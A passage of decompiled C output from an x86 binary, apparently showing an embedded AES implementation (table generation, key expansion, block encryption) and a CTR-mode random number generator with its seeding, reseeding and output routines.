      a1[22] = 0;
    }
    if ( a1 != (_DWORD *)-68 )
    {
      v14 = a1[19];
      if ( v14 )
      {
        if ( 4 * a1[18] )
          sub_413EB0(v14, 0, 4 * a1[18]);
        result = off_423FA4(a1[19]);
      }
      a1[17] = 1;
      a1[18] = 0;
      a1[19] = 0;
    }
  }
  return result;
}
// 423FA4: using guessed type int (__cdecl *off_423FA4)(_DWORD);

//----- (00405EC0) --------------------------------------------------------
int sub_405EC0()
{
  int v0; // ecx
  int v1; // eax
  int v2; // eax
  int *v3; // ecx
  int i; // ebx
  int v5; // eax
  int v6; // ecx
  int v7; // edx
  int v8; // eax
  int v9; // ecx
  int v10; // eax
  int j; // ecx
  int v12; // esi
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // esi
  int v17; // ebx
  int v18; // edi
  int result; // eax
  int v20; // edx
  int v21; // edx
  int v22; // edx
  int v23; // edx
  int v24[255]; // [esp+Ch] [ebp-804h]
  char v25[40]; // [esp+408h] [ebp-408h]
  int v26; // [esp+430h] [ebp-3E0h]
  int v27; // [esp+438h] [ebp-3D8h]
  int v28; // [esp+440h] [ebp-3D0h]
  int v29; // [esp+444h] [ebp-3CCh]
  int v30; // [esp+80Ch] [ebp-4h]

  v0 = 0;
  v1 = 1;
  do
  {
    v24[v0] = v1;
    *(_DWORD *)&v25[4 * v1 + 4] = v0++;
    v1 = (unsigned __int8)((2 * v1) ^ ((char)(v1 & 0x80) != 0 ? 0x1B : 0) ^ v1);
  }
  while ( v0 < 256 );
  v2 = 1;
  v3 = &dword_426A88;
  do
  {
    *v3++ = v2;
    v2 = (unsigned __int8)(((char)(v2 & 0x80) != 0 ? 0x1B : 0) ^ (2 * v2));
  }
  while ( (int)v3 < (int)dword_426AB0 );
  byte_426188[0] = 99;
  byte_428313 = 0;
  for ( i = 1; i < 256; ++i )
  {
    v5 = *(_DWORD *)&v25[-4 * *(_DWORD *)&v25[4 * i + 4]];
    v6 = (unsigned __int8)((2 * v5) | (v5 >> 7));
    v7 = (unsigned __int8)((2 * v6) | (v6 >> 7));
    v8 = v7 ^ v6 ^ v5;
    v9 = (unsigned __int8)((2 * v7) | (v7 >> 7));
    v10 = (unsigned __int8)((2 * v9) | (v9 >> 7)) ^ 0x63 ^ v9 ^ v8;
    byte_426188[i] = v10;
    byte_4282B0[v10] = i;
  }
  for ( j = 0; j < 256; ++j )
  {
    v12 = (unsigned __int8)byte_426188[j];
    v13 = (unsigned __int8)((2 * v12) ^ ((char)(byte_426188[j] & 0x80) != 0 ? 0x1B : 0)) ^ ((v12 ^ ((v12 ^ ((v12 ^ (unsigned __int8)((2 * v12) ^ ((char)(byte_426188[j] & 0x80) != 0 ? 0x1B : 0))) << 8)) << 8)) << 8);
    dword_427EB0[j] = v13;
    v14 = __ROL4__(v13, 8);
    dword_427AB0[j] = v14;
    v15 = __ROL4__(v14, 8);
    dword_4276B0[j] = v15;
    dword_4272B0[j] = __ROL4__(v15, 8);
    if ( byte_4282B0[j] )
    {
      v16 = *(_DWORD *)&v25[4 * (unsigned __int8)byte_4282B0[j] + 4];
      v30 = v24[(v16 + v29) % 255];
      v17 = v24[(v16 + v26) % 255];
      v18 = v24[(v16 + v28) % 255];
      result = v30;
      v20 = v24[(v16 + v27) % 255];
    }
    else
    {
      result = 0;
      v17 = 0;
      v18 = 0;
      v20 = 0;
    }
    v21 = result ^ ((v17 ^ ((v18 ^ (v20 << 8)) << 8)) << 8);
    dword_426EB0[j] = v21;
    v22 = __ROL4__(v21, 8);
    dword_426AB0[j] = v22;
    v23 = __ROL4__(v22, 8);
    dword_426688[j] = v23;
    dword_426288[j] = __ROL4__(v23, 8);
  }
  return result;
}
// 426288: using guessed type int dword_426288[256];
// 426688: using guessed type int dword_426688[255];
// 426A88: using guessed type int dword_426A88;
// 426AB0: using guessed type int dword_426AB0[256];
// 426EB0: using guessed type int dword_426EB0[256];
// 4272B0: using guessed type int dword_4272B0[256];
// 4276B0: using guessed type int dword_4276B0[256];
// 427AB0: using guessed type int dword_427AB0[256];
// 427EB0: using guessed type int dword_427EB0[256];
// 428313: using guessed type char byte_428313;
// 405EC0: using guessed type int var_804[255];

//----- (004060E0) --------------------------------------------------------
int __usercall sub_4060E0@<eax>(_DWORD *a1@<eax>, int a2)
{
  bool v2; // zf
  int *v4; // eax
  unsigned int v5; // edx
  unsigned __int16 *v6; // ecx
  int v7; // esi
  int v8; // esi
  unsigned int v9; // esi
  int v10; // edi
  int v11; // ecx
  int v12; // edx
  int v13; // ecx
  int v14; // edx
  int v15; // ecx
  int v16; // edx
  int v17; // ecx
  unsigned int v19; // edx
  int v20; // edi
  int v21; // ecx
  int v22; // esi
  int v23; // ecx
  int v24; // esi
  int v25; // ecx
  int v26; // ecx
  int v27; // ecx
  int v28; // edi
  int v29; // esi
  int v30; // ecx
  int v31; // esi
  int v32; // edi
  int v33; // ecx
  int v34; // esi
  int v35; // ecx
  int v36; // esi
  int v37; // ecx
  int v38; // esi
  int v39; // edi
  int v40; // ecx
  int v41; // esi
  int v42; // ecx
  int v43; // esi
  int v44; // ecx
  int v45; // esi
  int v46; // ecx
  int v47; // esi
  unsigned int v48; // edx
  int v49; // ebx
  int v50; // ecx
  int v51; // edi
  int v52; // esi
  int v53; // edi
  int v54; // ecx
  int v55; // esi
  int v56; // edi
  int v57; // ecx
  int v58; // esi
  int v59; // ecx
  int v60; // esi
  int v61; // edi
  int v62; // ecx
  int v63; // ecx
  int v64; // esi
  int v65; // edi
  int v66; // ecx
  int v67; // esi
  int v68; // ecx
  int v69; // esi
  int v70; // ecx
  int v71; // esi
  int v72; // ecx
  int v73; // esi

  v2 = dword_429DE0 == 0;
  *a1 = 14;
  if ( v2 )
  {
    sub_405EC0();
    dword_429DE0 = 1;
  }
  v4 = a1 + 2;
  v5 = 0;
  a1[1] = a1 + 2;
  v6 = (unsigned __int16 *)(a2 + 2);
  do
  {
    v4[v5++] = *((unsigned __int8 *)v6 - 2) | ((*((unsigned __int8 *)v6 - 1) | (*v6 << 8)) << 8);
    v6 += 2;
  }
  while ( v5 < 8 );
  v7 = *a1 - 10;
  if ( !v7 )
  {
    v48 = 0;
    do
    {
      v49 = v4[3];
      v50 = *v4 ^ dword_426A88[v48] ^ (unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 13)] ^ (((unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 14)] ^ (((unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 15)] ^ ((unsigned __int8)byte_426188[(unsigned __int8)v49] << 8)) << 8)) << 8);
      v51 = v4[2];
      v52 = v50 ^ v4[1];
      v4[4] = v50;
      v53 = v52 ^ v51;
      v4[5] = v52;
      v4[6] = v53;
      v4[7] = v53 ^ v49;
      v54 = v4[4] ^ dword_426A8C[v48] ^ (unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 29)] ^ (((unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 30)] ^ (((unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 31)] ^ ((unsigned __int8)byte_426188[(unsigned __int8)(v53 ^ v49)] << 8)) << 8)) << 8);
      v55 = v54 ^ v4[5];
      v4[8] = v54;
      v56 = v55 ^ v53;
      v57 = v56 ^ v4[7];
      v4[11] = v57;
      v4[9] = v55;
      v58 = *((unsigned __int8 *)v4 + 47);
      v4[10] = v56;
      v59 = v4[8] ^ dword_426A90[v48] ^ (unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 45)] ^ (((unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 46)] ^ (((unsigned __int8)byte_426188[v58] ^ ((unsigned __int8)byte_426188[(unsigned __int8)v57] << 8)) << 8)) << 8);
      v60 = v59 ^ v4[9];
      v4[12] = v59;
      v61 = v60 ^ v56;
      v62 = v61 ^ v4[11];
      v4[15] = v62;
      v4[13] = v60;
      v4[14] = v61;
      v63 = v4[12] ^ dword_426A94[v48] ^ (unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 61)] ^ (((unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 62)] ^ (((unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 63)] ^ ((unsigned __int8)byte_426188[(unsigned __int8)v62] << 8)) << 8)) << 8);
      v48 += 5;
      v64 = v63 ^ v4[13];
      v4[16] = v63;
      v65 = v64 ^ v61;
      v66 = v65 ^ v4[15];
      v4[19] = v66;
      v4[17] = v64;
      v67 = *((unsigned __int8 *)v4 + 79);
      v4[18] = v65;
      v68 = dword_426A84[v48] ^ (unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 77)] ^ (((unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 78)] ^ (((unsigned __int8)byte_426188[v67] ^ ((unsigned __int8)byte_426188[(unsigned __int8)v66] << 8)) << 8)) << 8);
      v69 = v4[17];
      v70 = v4[16] ^ v68;
      v4 += 20;
      v71 = v70 ^ v69;
      *v4 = v70;
      v4[1] = v71;
      v72 = v71 ^ v65;
      v73 = v71 ^ v65 ^ *(v4 - 1);
      v4[2] = v72;
      v4[3] = v73;
    }
    while ( v48 < 10 );
    return 0;
  }
  v8 = v7 - 2;
  if ( !v8 )
  {
    v19 = 0;
    do
    {
      v20 = v4[5];
      v21 = *v4 ^ dword_426A88[v19] ^ (unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 21)] ^ (((unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 22)] ^ (((unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 23)] ^ ((unsigned __int8)byte_426188[(unsigned __int8)v20] << 8)) << 8)) << 8);
      v22 = v21 ^ v4[1];
      v4[6] = v21;
      v23 = v22 ^ v4[2];
      v4[8] = v23;
      v4[7] = v22;
      v24 = v23 ^ v4[3];
      v25 = v24 ^ v4[4];
      v4[10] = v25;
      v26 = v20 ^ v25;
      v4[11] = v26;
      v4[9] = v24;
      v27 = v4[6] ^ dword_426A8C[v19] ^ (unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 45)] ^ (((unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 46)] ^ (((unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 47)] ^ ((unsigned __int8)byte_426188[(unsigned __int8)v26] << 8)) << 8)) << 8);
      v28 = v4[10];
      v29 = v27 ^ v4[7];
      v4[12] = v27;
      v30 = v29 ^ v4[8];
      v4[14] = v30;
      v4[13] = v29;
      v31 = v30 ^ v4[9];
      v32 = v31 ^ v28;
      v33 = v32 ^ v4[11];
      v4[17] = v33;
      v4[15] = v31;
      v34 = *((unsigned __int8 *)v4 + 71);
      v4[16] = v32;
      v35 = v4[12] ^ dword_426A90[v19] ^ (unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 69)] ^ (((unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 70)] ^ (((unsigned __int8)byte_426188[v34] ^ ((unsigned __int8)byte_426188[(unsigned __int8)v33] << 8)) << 8)) << 8);
      v36 = v35 ^ v4[13];
      v4[18] = v35;
      v37 = v36 ^ v4[14];
      v4[19] = v36;
      v38 = v37 ^ v4[15];
      v4[20] = v37;
      v39 = v38 ^ v32;
      v40 = v39 ^ v4[17];
      v4[23] = v40;
      v4[21] = v38;
      v41 = *((unsigned __int8 *)v4 + 95);
      v4[22] = v39;
      v42 = v4[18] ^ dword_426A94[v19] ^ (unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 93)] ^ (((unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 94)] ^ (((unsigned __int8)byte_426188[v41] ^ ((unsigned __int8)byte_426188[(unsigned __int8)v40] << 8)) << 8)) << 8);
      v19 += 4;
      v43 = v42 ^ v4[19];
      v4[24] = v42;
      v44 = v43 ^ v4[20];
      v4[25] = v43;
      v45 = v44 ^ v4[21];
      v4[26] = v44;
      v4[27] = v45;
      v46 = v45 ^ v39;
      v47 = v45 ^ v39 ^ v4[23];
      v4[28] = v46;
      v4[29] = v47;
      v4 += 24;
    }
    while ( v19 < 8 );
    return 0;
  }
  v9 = v8 - 2;
  if ( v9 )
    return 0;
  do
  {
    v10 = v4[7];
    v11 = *v4 ^ *(int *)((char *)dword_426A88 + v9) ^ (unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 29)] ^ (((unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 30)] ^ (((unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 31)] ^ ((unsigned __int8)byte_426188[(unsigned __int8)v10] << 8)) << 8)) << 8);
    v9 += 4;
    v12 = v11 ^ v4[1];
    v4[8] = v11;
    v13 = v12 ^ v4[2];
    v4[10] = v13;
    v4[9] = v12;
    v14 = v13 ^ v4[3];
    v4[11] = v14;
    v15 = v4[4] ^ (unsigned __int8)byte_426188[(unsigned __int8)v14] ^ (((unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 45)] ^ (((unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 46)] ^ ((unsigned __int8)byte_426188[*((unsigned __int8 *)v4 + 47)] << 8)) << 8)) << 8);
    v16 = v15 ^ v4[5];
    v4[12] = v15;
    v17 = v16 ^ v4[6];
    v4[14] = v17;
    v4[13] = v16;
    v4[15] = v10 ^ v17;
    v4 += 8;
  }
  while ( v9 < 0x1C );
  return 0;
}
// 426A84: using guessed type int dword_426A84[];
// 426A88: using guessed type int dword_426A88[];
// 426A8C: using guessed type int dword_426A8C[];
// 426A90: using guessed type int dword_426A90[];
// 426A94: using guessed type int dword_426A94[];
// 429DE0: using guessed type int dword_429DE0;

//----- (00406620) --------------------------------------------------------
int __cdecl sub_406620(unsigned int a1, unsigned int *a2)
{
  unsigned __int8 *v2; // ecx
  int v3; // ebx
  int v4; // edi
  int v5; // edx
  int v6; // esi
  int v7; // edx
  int v8; // esi
  unsigned int v9; // edi
  int v10; // ebx
  int v11; // esi
  int v12; // edx
  int v13; // ecx
  int v14; // esi
  int v15; // ecx
  unsigned int v16; // ebx
  unsigned int v17; // esi
  _DWORD *v18; // eax
  int v19; // edx
  unsigned int v20; // ecx
  int v21; // esi
  int v22; // edi
  int v23; // edx
  int v24; // edi
  unsigned int v25; // esi
  int v26; // edi
  int v27; // edi
  unsigned int v28; // ebx
  int v29; // edx
  int v30; // edi
  int v31; // edx
  int v32; // edx
  int v33; // ecx
  int v34; // ecx
  int v35; // edx
  unsigned int v36; // ecx
  int v37; // edx
  unsigned int v38; // edx
  int v39; // esi
  int v40; // ebx
  int v41; // esi
  int v42; // ebx
  int v43; // esi
  int v44; // ecx
  int v45; // ebx
  int v46; // ebx
  unsigned int *v47; // eax
  unsigned int v48; // ecx
  unsigned int v50; // [esp+10h] [ebp-24h] BYREF
  int i; // [esp+14h] [ebp-20h]
  unsigned int v52; // [esp+18h] [ebp-1Ch] BYREF
  unsigned int v53; // [esp+1Ch] [ebp-18h] BYREF
  unsigned int v54; // [esp+20h] [ebp-14h] BYREF
  unsigned int v55; // [esp+24h] [ebp-10h] BYREF
  unsigned int v56; // [esp+28h] [ebp-Ch] BYREF
  unsigned int v57; // [esp+2Ch] [ebp-8h] BYREF
  _DWORD *v58; // [esp+30h] [ebp-4h] BYREF

  v3 = v2[11];
  v4 = *v2 | ((v2[1] | (*((unsigned __int16 *)v2 + 1) << 8)) << 8);
  v5 = v2[5] | (*((unsigned __int16 *)v2 + 3) << 8);
  v6 = v2[4];
  v58 = *(_DWORD **)(a1 + 4);
  v7 = v6 | (v5 << 8);
  v8 = v2[15];
  v56 = v4;
  v9 = *v58 ^ v4;
  v57 = v7;
  ++v58;
  v56 = v9;
  v57 = *v58 ^ v7;
  v10 = v2[8] | ((v2[9] | ((v2[10] | (v3 << 8)) << 8)) << 8);
  v11 = v2[14] | (v8 << 8);
  v12 = v2[13];
  v13 = v2[12];
  ++v58;
  v14 = v13 | ((v12 | (v11 << 8)) << 8);
  v15 = *(_DWORD *)a1;
  v55 = v10;
  v16 = *v58++ ^ v10;
  v53 = v14;
  v55 = v16;
  v17 = *v58 ^ v14;
  v18 = v58 + 1;
  v53 = v17;
  ++v58;
  for ( i = (v15 >> 1) - 1; i > 0; --i )
  {
    v19 = dword_427EB0[(unsigned __int8)v57] ^ dword_4272B0[HIBYTE(v9)] ^ dword_427AB0[BYTE1(v16)] ^ dword_4276B0[BYTE2(v17)];
    v20 = *v18 ^ dword_427EB0[(unsigned __int8)v9] ^ dword_4272B0[HIBYTE(v17)] ^ dword_427AB0[BYTE1(v57)] ^ dword_4276B0[BYTE2(v16)];
    v21 = dword_427EB0[(unsigned __int8)v55] ^ dword_4272B0[HIBYTE(v57)] ^ dword_4276B0[BYTE2(v9)] ^ dword_427AB0[BYTE1(v17)];
    v22 = dword_4272B0[HIBYTE(v55)] ^ dword_427AB0[BYTE1(v9)] ^ dword_4276B0[BYTE2(v57)];
    v58 = v18 + 1;
    v52 = v20;
    v23 = v18[1] ^ v19;
    v24 = dword_427EB0[(unsigned __int8)v53] ^ v22;
    v58 = v18 + 2;
    a1 = v23;
    v25 = v18[2] ^ v21;
    v58 = v18 + 3;
    v50 = v25;
    v54 = v18[3] ^ v24;
    v26 = dword_427AB0[BYTE1(v23)] ^ dword_4276B0[BYTE2(v25)];
    v58 = v18 + 4;
    v56 = v18[4] ^ dword_427EB0[(unsigned __int8)v20] ^ dword_4272B0[HIBYTE(v54)] ^ v26;
    v27 = dword_427EB0[(unsigned __int8)v23] ^ dword_4272B0[HIBYTE(v20)] ^ dword_427AB0[BYTE1(v25)] ^ dword_4276B0[BYTE2(v54)];
    v58 = v18 + 5;
    v57 = v18[5] ^ v27;
    v28 = v23;
    v29 = dword_427AB0[BYTE1(v20)] ^ dword_4276B0[BYTE2(v23)];
    v30 = dword_427EB0[(unsigned __int8)v25] ^ dword_4272B0[HIBYTE(v28)] ^ dword_4276B0[BYTE2(v20)] ^ dword_427AB0[BYTE1(v54)];
    v58 = v18 + 6;
    v31 = dword_427EB0[(unsigned __int8)v54] ^ dword_4272B0[HIBYTE(v25)] ^ v29;
    v16 = v18[6] ^ v30;
    v9 = v56;
    v58 = v18 + 7;
    v55 = v16;
    v32 = v18[7] ^ v31;
    v18 += 8;
    v17 = v32;
    v53 = v32;
    v58 = v18;
  }
  v52 = *v18 ^ dword_427EB0[(unsigned __int8)v9] ^ dword_4272B0[HIBYTE(v17)] ^ dword_427AB0[BYTE1(v57)] ^ dword_4276B0[BYTE2(v16)];
  v33 = dword_427EB0[(unsigned __int8)v57] ^ dword_4272B0[HIBYTE(v9)] ^ dword_427AB0[BYTE1(v16)] ^ dword_4276B0[BYTE2(v17)];
  v58 = v18 + 1;
  a1 = v18[1] ^ v33;
  v34 = dword_427EB0[(unsigned __int8)v16] ^ dword_4272B0[HIBYTE(v57)] ^ dword_4276B0[BYTE2(v9)] ^ dword_427AB0[BYTE1(v17)];
  v35 = dword_427AB0[BYTE1(v9)] ^ dword_4276B0[BYTE2(v57)];
  v58 = v18 + 2;
  v36 = v18[2] ^ v34;
  v37 = dword_427EB0[(unsigned __int8)v17] ^ dword_4272B0[HIBYTE(v16)] ^ v35;
  v58 = v18 + 3;
  v50 = v36;
  v38 = v18[3] ^ v37;
  v39 = (((unsigned __int8)byte_426188[HIBYTE(v38)] << 8) ^ (unsigned __int8)byte_426188[BYTE2(v36)]) << 8;
  v54 = v38;
  v58 = v18 + 4;
  v40 = (unsigned __int8)byte_426188[HIBYTE(v52)];
  v56 = v18[4] ^ (unsigned __int8)byte_426188[(unsigned __int8)v52] ^ (((unsigned __int8)byte_426188[BYTE1(a1)] ^ v39) << 8);
  v41 = (unsigned __int8)byte_426188[(unsigned __int8)a1] ^ (((unsigned __int8)byte_426188[BYTE1(v36)] ^ (((v40 << 8) ^ (unsigned __int8)byte_426188[BYTE2(v38)]) << 8)) << 8);
  v42 = (unsigned __int8)byte_426188[HIBYTE(a1)];
  v58 = v18 + 5;
  v57 = v18[5] ^ v41;
  v43 = (unsigned __int8)byte_426188[(unsigned __int8)v36] ^ (((unsigned __int8)byte_426188[BYTE1(v38)] ^ (((v42 << 8) ^ (unsigned __int8)byte_426188[BYTE2(v52)]) << 8)) << 8);
  v58 = v18 + 6;
  v44 = (unsigned __int8)byte_426188[HIBYTE(v36)];
  v55 = v18[6] ^ v43;
  v45 = (unsigned __int8)byte_426188[(unsigned __int8)v38] ^ (((unsigned __int8)byte_426188[BYTE1(v52)] ^ (((v44 << 8) ^ (unsigned __int8)byte_426188[BYTE2(a1)]) << 8)) << 8);
  v58 = v18 + 7;
  v46 = v18[7] ^ v45;
  v53 = v46;
  v58 = v18 + 8;
  v47 = a2;
  *a2 = v56;
  HIWORD(v44) = HIWORD(v57);
  *((_WORD *)v47 + 2) = v57;
  BYTE2(v38) = BYTE2(v44);
  *((_BYTE *)v47 + 7) = HIBYTE(v44);
  v48 = v55;
  *((_BYTE *)v47 + 6) = BYTE2(v38);
  v47[2] = v48;
  v47[3] = v46;
  sub_413EB0((int)&v56, 0, 4u);
  sub_413EB0((int)&v57, 0, 4u);
  sub_413EB0((int)&v55, 0, 4u);
  sub_413EB0((int)&v53, 0, 4u);
  sub_413EB0((int)&v52, 0, 4u);
  sub_413EB0((int)&a1, 0, 4u);
  sub_413EB0((int)&v50, 0, 4u);
  sub_413EB0((int)&v54, 0, 4u);
  sub_413EB0((int)&v58, 0, 4u);
  return 0;
}
// 406644: variable 'v2' is possibly undefined
// 4272B0: using guessed type int dword_4272B0[256];
// 4276B0: using guessed type int dword_4276B0[256];
// 427AB0: using guessed type int dword_427AB0[256];
// 427EB0: using guessed type int dword_427EB0[256];

//----- (00406D00) --------------------------------------------------------
int __usercall sub_406D00@<eax>(unsigned int a1@<eax>, int a2, const __m128i *a3)
{
  unsigned int v5; // ebx
  int i; // eax
  int v7; // esi
  int v8; // ecx
  int v9; // edi
  int k; // ecx
  int v11; // eax
  int v12; // eax
  int v13; // edx
  int v14; // eax
  _DWORD *v15; // ebx
  int j; // edi
  unsigned int v17; // edx
  unsigned int v18; // eax
  unsigned int v19; // ecx
  int v20; // [esp+10h] [ebp-320h] BYREF
  int v21; // [esp+14h] [ebp-31Ch]
  int v22; // [esp+18h] [ebp-318h]
  int v23; // [esp+1Ch] [ebp-314h]
  int v24; // [esp+20h] [ebp-310h]
  unsigned int v25; // [esp+24h] [ebp-30Ch]
  int v26[8]; // [esp+28h] [ebp-308h] BYREF
  unsigned int v27[4]; // [esp+48h] [ebp-2E8h] BYREF
  char v28[32]; // [esp+58h] [ebp-2D8h] BYREF
  char v29[3]; // [esp+78h] [ebp-2B8h] BYREF
  char v30; // [esp+7Bh] [ebp-2B5h]
  char v31; // [esp+88h] [ebp-2A8h]
  char v32; // [esp+89h] [ebp-2A7h]
  char v33; // [esp+8Ah] [ebp-2A6h]
  char v34; // [esp+8Bh] [ebp-2A5h]
  char v35; // [esp+8Fh] [ebp-2A1h]
  char v36[392]; // [esp+90h] [ebp-2A0h] BYREF
  _DWORD v37[70]; // [esp+218h] [ebp-118h] BYREF

  if ( a1 > 0x180 )
    return -56;
  sub_413EB0((int)v29, 0, 0x1A0u);
  sub_413EB0((int)v37, 0, 0x118u);
  v31 = HIBYTE(a1);
  v32 = BYTE2(a1);
  v33 = BYTE1(a1);
  v34 = a1;
  v35 = 48;
  sub_415930((unsigned int)v36, a3, a1);
  v36[a1] = 0x80;
  v5 = a1 + 25;
  v25 = v5;
  for ( i = 0; i < 32; ++i )
    v28[i] = i;
  v7 = sub_4060E0(v37, (int)v28);
  if ( !v7 )
  {
    v8 = 0;
    v24 = 0;
    while ( 1 )
    {
      v20 = 0;
      v21 = 0;
      v22 = 0;
      v23 = 0;
      if ( v5 )
        break;
LABEL_16:
      v12 = v21;
      ++v30;
      *(int *)((char *)v26 + v8) = v20;
      v13 = v22;
      *(int *)((char *)&v26[1] + v8) = v12;
      v14 = v23;
      *(int *)((char *)&v26[2] + v8) = v13;
      *(int *)((char *)&v26[3] + v8) = v14;
      v8 += 16;
      v24 = v8;
      if ( v8 >= 48 )
      {
        v7 = sub_4060E0(v37, (int)v26);
        if ( !v7 )
        {
          v15 = (_DWORD *)a2;
          for ( j = 0; j < 48; j += 16 )
          {
            v7 = sub_406620((unsigned int)v37, v27);
            if ( v7 )
              break;
            v17 = v27[1];
            v18 = v27[2];
            *v15 = v27[0];
            v19 = v27[3];
            v15[1] = v17;
            v15[2] = v18;
            v15[3] = v19;
            v15 += 4;
          }
        }
        goto LABEL_21;
      }
    }
    v9 = v29 - (char *)&v20;
    while ( 1 )
    {
      for ( k = 0; k < 16; ++k )
        *((_BYTE *)&v20 + k) ^= *((_BYTE *)&v20 + k + v9);
      v9 += 16;
      v11 = 16;
      if ( v5 < 0x10 )
        v11 = v5;
      v5 -= v11;
      v7 = sub_406620((unsigned int)v37, (unsigned int *)&v20);
      if ( v7 )
        break;
      if ( !v5 )
      {
        v8 = v24;
        v5 = v25;
        goto LABEL_16;
      }
    }
  }
LABEL_21:
  sub_413EB0((int)v37, 0, 0x118u);
  sub_413EB0((int)v29, 0, 0x1A0u);
  sub_413EB0((int)v26, 0, 0x30u);
  sub_413EB0((int)v28, 0, 0x20u);
  sub_413EB0((int)&v20, 0, 0x10u);
  if ( v7 )
    sub_413EB0(a2, 0, 0x30u);
  return v7;
}
// 406D00: using guessed type _DWORD var_118[70];
// 406D00: using guessed type char var_2A0[392];
// 406D00: using guessed type char var_2D8[32];

//----- (00406F60) --------------------------------------------------------
int __usercall sub_406F60@<eax>(_DWORD *a1@<ebx>, int a2@<esi>)
{
  int v2; // ecx
  _BYTE *v3; // eax
  int v5; // edi
  int j; // ecx
  char *v7; // eax
  int v8; // edx
  int v9; // eax
  int v10; // ecx
  char v12[32]; // [esp+4h] [ebp-3Ch] BYREF
  int v13; // [esp+24h] [ebp-1Ch]
  int v14; // [esp+28h] [ebp-18h]
  int v15; // [esp+2Ch] [ebp-14h]
  int v16; // [esp+30h] [ebp-10h]
  int i; // [esp+34h] [ebp-Ch]
  int v18; // [esp+38h] [ebp-8h]
  unsigned int *v19; // [esp+3Ch] [ebp-4h]

  v19 = (unsigned int *)v12;
  sub_413EB0((int)v12, 0, 0x30u);
  v2 = 1 - (_DWORD)a1;
  v18 = 0;
  for ( i = 1 - (_DWORD)a1; ; v2 = i )
  {
    v3 = (char *)a1 + 15;
    do
    {
      if ( (*v3)++ != 0xFF )
        break;
      --v3;
    }
    while ( (int)&v3[v2] > 0 );
    v5 = sub_406620((unsigned int)(a1 + 8), v19);
    if ( v5 )
      break;
    v19 += 4;
    v18 += 16;
    if ( v18 >= 48 )
    {
      for ( j = 0; j < 48; j += 6 )
      {
        v7 = &v12[j];
        *v7 ^= v7[a2 - (_DWORD)v12];
        v7[1] ^= *(_BYTE *)(a2 + j + 1);
        v7[2] ^= *(_BYTE *)(a2 + j + 2);
        v7[3] ^= *(_BYTE *)(a2 + j + 3);
        v7[4] ^= *(_BYTE *)(a2 + j + 4);
        v7[5] ^= *(_BYTE *)(a2 + j + 5);
      }
      v5 = sub_4060E0(a1 + 8, (int)v12);
      if ( !v5 )
      {
        v8 = v14;
        v9 = v15;
        *a1 = v13;
        v10 = v16;
        a1[1] = v8;
        a1[2] = v9;
        a1[3] = v10;
      }
      break;
    }
  }
  sub_413EB0((int)v12, 0, 0x30u);
  return v5;
}

//----- (00407060) --------------------------------------------------------
int __usercall sub_407060@<eax>(int a1@<eax>, unsigned int a2@<edi>, const __m128i *a3)
{
  unsigned int v4; // esi
  unsigned int v6; // esi
  int v7; // esi
  __m128i v8[24]; // [esp+8h] [ebp-184h] BYREF

  v4 = *(_DWORD *)(a1 + 24);
  if ( v4 > 0x180 || a2 > 384 - v4 )
    return -56;
  sub_413EB0((int)v8, 0, 0x180u);
  if ( (*(int (__cdecl **)(_DWORD, __m128i *, unsigned int))(a1 + 312))(*(_DWORD *)(a1 + 316), v8, v4) )
    return -52;
  v6 = *(_DWORD *)(a1 + 24);
  if ( a3 && a2 )
  {
    sub_415930((unsigned int)v8 + v6, a3, a2);
    v6 += a2;
  }
  v7 = sub_406D00(v6, (int)v8, v8);
  if ( !v7 )
  {
    v7 = sub_406F60((_DWORD *)a1, (int)v8);
    if ( !v7 )
      *(_DWORD *)(a1 + 16) = 1;
  }
  sub_413EB0((int)v8, 0, 0x180u);
  return v7;
}
// 407060: using guessed type __m128i var_184[24];

//----- (00407150) --------------------------------------------------------
int __cdecl sub_407150(_DWORD *a1, unsigned int a2, unsigned int a3, const __m128i *a4, unsigned int a5)
{
  int result; // eax
  int v7; // esi
  int v8; // ecx
  _BYTE *v9; // eax
  bool v10; // zf
  unsigned int v11; // esi
  char v12[48]; // [esp+10h] [ebp-44h] BYREF
  __m128i v13; // [esp+40h] [ebp-14h] BYREF
  int i; // [esp+5Ch] [ebp+8h]

  if ( a3 > 0x400 )
    return -54;
  if ( a5 > 0x100 )
    return -56;
  sub_413EB0((int)v12, 0, 0x30u);
  if ( a1[4] <= a1[7] && !a1[5] )
  {
    if ( a5 )
    {
      v7 = sub_406D00(a5, (int)v12, a4);
      if ( v7 || (v7 = sub_406F60(a1, (int)v12)) != 0 )
      {
LABEL_24:
        sub_413EB0((int)v12, 0, 0x30u);
        sub_413EB0((int)&v13, 0, 0x10u);
        return v7;
      }
    }
LABEL_12:
    if ( a3 )
    {
      v8 = 1 - (_DWORD)a1;
      for ( i = 1 - (_DWORD)a1; ; v8 = i )
      {
        v9 = (char *)a1 + 15;
        do
        {
          v10 = (*v9)++ == 0xFF;
          if ( !v10 )
            break;
          --v9;
        }
        while ( (int)&v9[v8] > 0 );
        v7 = sub_406620((unsigned int)(a1 + 8), (unsigned int *)&v13);
        if ( v7 )
          break;
        v11 = a3;
        if ( a3 > 0x10 )
          v11 = 16;
